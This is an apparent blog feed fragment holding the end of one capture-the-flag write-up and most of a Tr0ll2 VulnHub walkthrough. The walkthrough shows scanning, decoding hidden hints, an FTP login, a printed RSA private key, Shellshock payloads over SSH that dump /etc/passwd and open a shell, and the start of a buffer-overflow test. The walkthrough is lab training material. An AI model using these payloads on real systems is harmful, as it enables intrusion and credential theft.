</span><span class='line'>Dropping into /bin/sh
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'>cat /root/flag.txt
</span><span class='line'>               <span class="se">\ </span><span class="sb">`</span>-._......_.-<span class="sb">`</span> /
</span><span class='line'>                <span class="sb">`</span>.  <span class="s1">&#39;.    .&#39;</span>  .<span class="s1">&#39;     Oh Well, in the end you did it!</span>
</span><span class='line'><span class="s1">                 //  _`\/`_  \\      You stopped the olws&#39;</span> evil plan
</span><span class='line'>                <span class="o">||</span>  /<span class="se">\O</span><span class="o">||</span>O/<span class="se">\ </span> <span class="o">||</span>     By pwning their secret base you
</span><span class='line'>                <span class="p">|</span><span class="se">\ </span> <span class="se">\_</span>/<span class="o">||</span><span class="se">\_</span>/  /<span class="p">|</span>     saved the world!
</span><span class='line'>                <span class="se">\ </span><span class="s1">&#39;.   \/   .&#39;</span> /
</span><span class='line'>                / ^ <span class="sb">`</span><span class="s1">&#39;~  ~&#39;</span><span class="sb">`</span>   <span class="se">\</span>
</span><span class='line'>               /  _-^_~ -^_ ~-  <span class="p">|</span>
</span><span class='line'>               <span class="p">|</span> / ^_ -^_- ~_^<span class="se">\ </span><span class="p">|</span>
</span><span class='line'>               <span class="p">|</span> <span class="p">|</span>~_ ^- _-^_ -<span class="p">|</span> <span class="p">|</span>
</span><span class='line'>               <span class="p">|</span> <span class="se">\ </span> ^-~_ ~-_^ / <span class="p">|</span>
</span><span class='line'>               <span class="se">\_</span>/<span class="p">;</span>-.,____,.-<span class="p">;</span><span class="se">\_</span>/
</span><span class='line'>        <span class="o">==========(</span>_<span class="o">(</span>_<span class="o">(==)</span>_<span class="o">)</span>_<span class="o">)=========</span>
</span><span class='line'>
</span><span class='line'>The flag is: ea2e548590260e12030c2460f82c1cff8965cff1971107a9ecb3565b08c274f4
</span><span class='line'>
</span><span class='line'>Hope you enjoyed this vulnerable VM.
</span><span class='line'>Looking forward to see a writeup from you soon!
</span><span class='line'>don<span class="s1">&#39;t forget to ping me on twitter with your thoughts</span>
</span><span class='line'>
</span><span class='line'><span class="s1">Sincerely</span>
</span><span class='line'><span class="s1">@Swappage</span>
</span><span class='line'>
</span><span class='line'><span class="s1">PS: why the owls? oh well, I really don&#39;</span>t know and yes: i really suck at fictioning :p
</span><span class='line'>True story is that i was looking <span class="k">for</span> some ASCII art to place in the puzzles and owls popped out first
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://media.tumblr.com/69d8d838b215ce8aeb5bcee2cac8c67a/tumblr_inline_n6f627Eb3o1rv1fhg.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Please do not feed the trolls.]]></title>
    <link href="http://recrudesce.github.io/2014/10/26/please-do-not-feed-the-trolls/"/>
    <updated>2014-10-26T14:36:45+00:00</updated>
    <id>http://recrudesce.github.io/2014/10/26/please-do-not-feed-the-trolls</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/Maleus21">Maleus</a> released <a href="http://vulnhub.com/entry/tr0ll-1,100/">Tr0ll</a> a while ago, and while I didn&rsquo;t attempt it, I figured I&rsquo;d do the follow up - <a href="http://vulnhub.com/entry/tr0ll-2,107/">Tr0ll2</a>. So, here is a quick runthrough of how to pwn it.</p>

<p>I would put this VM at beginner level - it&rsquo;s not particularly complicated. It&rsquo;s more a case of finding hidden data than actually doing any vulnerability exploitation. Lets get started.</p>

<!-- more -->


<p><img src="http://www.zerodayclothing.com/products/designs/trinity_design.png" alt="" /></p>

<p>And so should you.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T5 -p- --script banner 172.16.56.138
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-23 15:27 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.56.138
</span><span class='line'>Host is up <span class="o">(</span>0.00020s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">65532</span> closed ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>21/tcp open  ftp
</span><span class='line'><span class="p">|</span>_banner: <span class="m">220</span> Welcome to Tr0ll FTP... Only noobs stay <span class="k">for</span> a <span class="k">while</span>...
</span><span class='line'>22/tcp open  ssh
</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4
</span><span class='line'>80/tcp open  http
</span><span class='line'>MAC Address: 00:0C:29:14:2B:52 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 19.78 seconds
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>FTP, SSH and HTTP. Lets hit the HTTP server first, as that&rsquo;s where Tr0ll started.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_001.png" alt="tr0ll2_001" /></a></p>

<p>So, the usual then. A quick Nikto scan shows that there&rsquo;s a robots.txt file, which has the following in it</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>User-agent:*
</span><span class='line'>Disallow:
</span><span class='line'>/noob
</span><span class='line'>/nope
</span><span class='line'>/try_harder
</span><span class='line'>/keep_trying
</span><span class='line'>/isnt_this_annoying
</span><span class='line'>/nothing_here
</span><span class='line'>/404
</span><span class='line'>/LOL_at_the_last_one
</span><span class='line'>/trolling_is_fun
</span><span class='line'>/zomg_is_this_it
</span><span class='line'>/you_found_me
</span><span class='line'>/I_know_this_sucks
</span><span class='line'>/You_could_give_up
</span><span class='line'>/dont_bother
</span><span class='line'>/will_it_ever_end
</span><span class='line'>/I_hope_you_scripted_this
</span><span class='line'>/ok_this_is_it
</span><span class='line'>/stop_whining
</span><span class='line'>/why_are_you_still_looking
</span><span class='line'>/just_quit
</span><span class='line'>/seriously_stop
</span></code></pre></td></tr></table></div></figure>


<p>Using this as a wordlist for dirb shows that only 4 of these directories actually result in an HTTP response other than 404.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# dirb http://172.16.56.138 troll_url.txt
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>DIRB v2.21
</span><span class='line'>By The Dark Raver
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>START_TIME: Thu Oct <span class="m">23</span> 15:31:32 2014
</span><span class='line'>URL_BASE: http://172.16.56.138/
</span><span class='line'>WORDLIST_FILES: troll_url.txt
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>GENERATED WORDS: <span class="m">21</span>
</span><span class='line'>
</span><span class='line'>---- Scanning URL: http://172.16.56.138/ ----
</span><span class='line'><span class="o">==</span>&gt; DIRECTORY: http://172.16.56.138/noob/
</span><span class='line'><span class="o">==</span>&gt; DIRECTORY: http://172.16.56.138/keep_trying/
</span><span class='line'><span class="o">==</span>&gt; DIRECTORY: http://172.16.56.138/dont_bother/
</span><span class='line'><span class="o">==</span>&gt; DIRECTORY: http://172.16.56.138/ok_this_is_it/
</span><span class='line'>
</span><span class='line'>---- Entering directory: http://172.16.56.138/noob/ ----
</span><span class='line'>
</span><span class='line'>---- Entering directory: http://172.16.56.138/keep_trying/ ----
</span><span class='line'>
</span><span class='line'>---- Entering directory: http://172.16.56.138/dont_bother/ ----
</span><span class='line'>
</span><span class='line'>---- Entering directory: http://172.16.56.138/ok_this_is_it/ ----
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>DOWNLOADED: <span class="m">105</span> - FOUND: 0
</span><span class='line'>root@pwk:~/troll#
</span></code></pre></td></tr></table></div></figure>


<p>Visiting these URL&rsquo;s provide the following page
<a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_002.png" alt="tr0ll2_002" /></a></p>

<p>While it looks like the page is identical for each of the 4 directories, on closer inspection, one of the images shown is slightly larger than the rest - this was determined by downloading each image.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-rw-r--r-- <span class="m">1</span> root root   <span class="m">15831</span> Oct  <span class="m">4</span> 09:57 cat_the_troll.jpg
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root   <span class="m">15873</span> Oct  <span class="m">4</span> 09:31 cat_the_troll.jpg.1
</span></code></pre></td></tr></table></div></figure>


<p>Running strings (NOOOO !!!!) on this file results in the following output</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Look Deep within y0ur_self <span class="k">for</span> the answer
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Which just so happens to be a folder on the webserver, containing an answer.txt file. Short story shorter, answer.txt is just a dictionary file but with each individual line base64 encoded.
On visual inspection, one line stands out&hellip; (yes, I could probably have written something, but scrolling through a large file and noticing strange anomalies is my bag, ok ?)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>SXNzYWNoYXIK
</span><span class='line'>SXN0YW5idWwK
</span><span class='line'>SXN0YW5idWwK
</span><span class='line'>SXN1enUK
</span><span class='line'>SXN1enUK
</span><span class='line'>SXQK
</span><span class='line'>SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg==
</span><span class='line'>SXRhaXB1Cg==
</span><span class='line'>SXRhaXB1Cg==
</span><span class='line'>SXRhbGlhbgo=
</span><span class='line'>SXRhbGlhbgo=
</span><span class='line'>SXRhbGlhbnMK
</span><span class='line'>SXRhbHkK
</span></code></pre></td></tr></table></div></figure>


<p>Decoded, we get</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">echo </span><span class="nv">SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg</span><span class="o">==</span> <span class="p">|</span> base64 -d
</span><span class='line'>ItCantReallyBeThisEasyRightLOL
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i780.photobucket.com/albums/yy82/dguy210/facepalm-star-trek-o_zps1270c857.gif" alt="" /></p>

<p>So, we&rsquo;ve exhausted the HTTP server by this point, so lets move onto FTP. I won&rsquo;t bore you with details, but the username and password combo is Tr0ll:Tr0ll. The only file residing on the FTP server is a ZIP file.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ftp 172.16.56.138
</span><span class='line'>Connected to 172.16.56.138.
</span><span class='line'><span class="m">220</span> Welcome to Tr0ll FTP... Only noobs stay <span class="k">for</span> a <span class="k">while</span>...
</span><span class='line'>Name <span class="o">(</span>172.16.56.138:root<span class="o">)</span>: Tr0ll
</span><span class='line'><span class="m">331</span> Please specify the password.
</span><span class='line'>Password: Tr0ll
</span><span class='line'><span class="m">230</span> Login successful.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; ls -l
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful. Consider using PASV.
</span><span class='line'><span class="m">150</span> Here comes the directory listing.
</span><span class='line'>-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">1474</span> Oct <span class="m">04</span> 01:09 lmao.zip
</span><span class='line'><span class="m">226</span> Directory send OK.
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>On extracting the ZIP file, we are asked for a password&hellip; lets try &ldquo;ItCantReallyBeThisEasyRightLOL&rdquo;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# unzip lmao.zip
</span><span class='line'>Archive:  lmao.zip
</span><span class='line'><span class="o">[</span>lmao.zip<span class="o">]</span> noob password: ItCantReallyBeThisEasyRightLOL
</span><span class='line'>  inflating: noob
</span></code></pre></td></tr></table></div></figure>


<p>which turns out to be an RSA private key - this is our route in via SSH.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
</span><span class='line'>yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
</span><span class='line'>/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
</span><span class='line'>q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
</span><span class='line'>z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
</span><span class='line'>e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
</span><span class='line'>u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
</span><span class='line'>gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
</span><span class='line'>UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
</span><span class='line'>La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
</span><span class='line'>xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
</span><span class='line'>aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
</span><span class='line'>K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
</span><span class='line'>n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
</span><span class='line'>TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
</span><span class='line'>WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
</span><span class='line'>ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
</span><span class='line'>0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
</span><span class='line'>vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
</span><span class='line'>ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
</span><span class='line'>th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
</span><span class='line'>G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
</span><span class='line'>q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
</span><span class='line'>vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
</span><span class='line'>zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span></code></pre></td></tr></table></div></figure>


<p>It is possible to SSH into the VM using the noob user, as per the key&rsquo;s filename, but we are immediately disconnected.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh -i key.key noob@172.16.56.138
</span><span class='line'>TRY HARDER LOL!
</span><span class='line'>Connection to 172.16.56.138 closed.
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Standard things here like &ndash;norc don&rsquo;t work, so lets try something new. SHELLSHOCK !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh -i key.key noob@172.16.56.138 <span class="s1">&#39;() { :;}; cat /etc/passwd&#39;</span>
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:104::/var/run/dbus:/bin/false
</span><span class='line'>maleus:x:1000:1000:Tr0ll,,,:/home/maleus:/bin/bash
</span><span class='line'>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>ftp:x:104:111:ftp daemon,,,:/srv/ftp:/bin/false
</span><span class='line'>noob:x:1002:1002::/home/noob:/bin/bash
</span><span class='line'>Tr0ll:x:1001:1001::/home/tr0ll:/bin/false
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Yup, we can get a shell with this using &lsquo;() { :;}; /bin/bash&rsquo;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh -i key.key noob@172.16.56.138 <span class="s1">&#39;() { :;}; /bin/bash&#39;</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>A small bit of enumeration here identifies the following folder structure</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/nothing_to_see_here/choose_wisely
</span><span class='line'>ls -l
</span><span class='line'>total 12
</span><span class='line'>drwsr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Oct  <span class="m">5</span> 21:16 door1
</span><span class='line'>drwsr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Oct  <span class="m">5</span> 21:19 door2
</span><span class='line'>drwsr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Oct  <span class="m">5</span> 21:17 door3
</span></code></pre></td></tr></table></div></figure>


<p>Each door folder includes a file called r00t, which is a binary. However, there are 3 different versions. One of them puts you into an rbash shell for 2 minutes, one of them kicks you out and reboots the VM, and the other one (the largest one) repeats anything you provide it via stdin. These files are SUID, so, looks like we have a standard buffer overflow here.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-rwsr-xr-x <span class="m">1</span> root root <span class="m">7273</span> Oct  <span class="m">5</span> 21:16 r00t
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root root <span class="m">8401</span> Oct  <span class="m">5</span> 21:16 r00t
</span><span class='line'>-rwsr-xr-x <span class="m">1</span> root root <span class="m">7271</span> Oct  <span class="m">5</span> 21:17 r00t
</span></code></pre></td></tr></table></div></figure>


<p>Something to note here before we carry on - a scheduled script rotates these files, so make sure you always work on the file that is 8401 bytes large - you may have to change into a different door directory.</p>

<p>Loading the file in GDB shows that you can easily overflow it with about 300 bytes of input.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# gdb ./r00t
</span><span class='line'>GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
</span><span class='line'>Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2012</span> Free Software Foundation, Inc.
</span><span class='line'>License GPLv3+: GNU GPL version <span class="m">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
</span><span class='line'>This is free software: you are free to change and redistribute it.
</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type <span class="s2">&quot;show copying&quot;</span>
</span><span class='line'>and <span class="s2">&quot;show warranty&quot;</span> <span class="k">for</span> details.
</span><span class='line'>This GDB was configured as <span class="s2">&quot;i486-linux-gnu&quot;</span>.
</span><span class='line'>For bug reporting instructions, please see:
</span><span class='line'>&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
</span><span class='line'>Reading symbols from /root/troll/r00t...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*300&#39;</span><span class="k">)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
